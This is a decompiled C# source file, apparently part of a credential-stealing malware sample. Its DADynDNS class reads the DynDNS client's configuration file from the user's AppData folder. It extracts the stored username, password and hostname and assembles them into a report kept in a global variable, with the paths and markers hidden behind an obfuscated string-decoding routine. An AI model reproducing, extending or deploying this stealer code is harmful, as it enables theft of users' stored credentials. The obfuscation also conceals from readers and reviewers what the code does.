using System;
using System.IO;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

public class DADynDNS
{
	public class DynDNSdll
	{
		public static void GetDADyn()
		{
			try
			{
				string sFile = Strings.Replace(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), Interaction.Environ("Username"), GOSLWHR.WHJBIYT("bLK9eJ+eq8PLHw==", "False"), 1, -1, (CompareMethod)0) + GOSLWHR.WHJBIYT("jZDQzJR/n7OzwJWty8PCja/GzLaas4XCyZ+wxdEZ", "False");
				string sInhalt = RDFLE(sFile);
				string text = CTME(sInhalt, GOSLWHR.WHJBIYT("maHT3tGxtgo=", "False"), GOSLWHR.WHJBIYT("W6Kzs6tVLw==", "False"));
				string text2 = CTME(sInhalt, GOSLWHR.WHJBIYT("bqekuKZ6oaSDMQ==", "False"), Environment.NewLine);
				string text3 = CTME(sInhalt, GOSLWHR.WHJBIYT("kLzZ4NavzcqqCg==", "False"), Environment.NewLine);
				string text4 = (NTUIYURW.PRLLJ = ((Operators.CompareString(text3, "", false) == 0) ? (GOSLWHR.WHJBIYT("ZoGMk4VmgYyThWaBk8+2bbLCk4VmgYyThWaBjJOFZoEf", "False") + Environment.NewLine + Environment.NewLine + GOSLWHR.WHJBIYT("arq6gImUtGyAZXSwbKWqibC+t7hGh7vIs4oh", "False") + Environment.NewLine + Environment.NewLine + GOSLWHR.WHJBIYT("a4aRmIprhpGYimuGkZiKa4aRmIprhpGYimuGkZiKa4Ya", "False")) : (GOSLWHR.WHJBIYT("ZoGMk4VmgYyThWaBk8+2bbLCk4VmgYyThWaBjJOFZoEf", "False") + Environment.NewLine + Environment.NewLine + GOSLWHR.WHJBIYT("fb/O1sdvcBM=", "False") + text + Environment.NewLine + GOSLWHR.WHJBIYT("d7CtwXtCJQ==", "False") + text2 + Environment.NewLine + GOSLWHR.WHJBIYT("g8W9mnIT", "False") + text3 + Environment.NewLine + Environment.NewLine + GOSLWHR.WHJBIYT("a4aRmIprhpGYimuGkZiKa4aRmIprhpGYimuGkZiKa4Ya", "False"))));
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				NTUIYURW.PRLLJ = "";
				ProjectData.ClearProjectError();
			}
		}

		public static string RDFLE(string sFile)
		{
			string result = default(string);
			try
			{
				StreamReader streamReader = new StreamReader(sFile);
				result = streamReader.ReadToEnd().ToString();
				return result;
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
				return result;
			}
		}

		public static string CTME(string sInhalt, string sText, string sText2)
		{
			string result = default(string);
			try
			{
				string[] array = Strings.Split(sInhalt, sText, -1, (CompareMethod)0);
				string[] array2 = Strings.Split(array[1], sText2, -1, (CompareMethod)0);
				result = array2[0];
				return result;
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
				return result;
			}
		}
	}
}
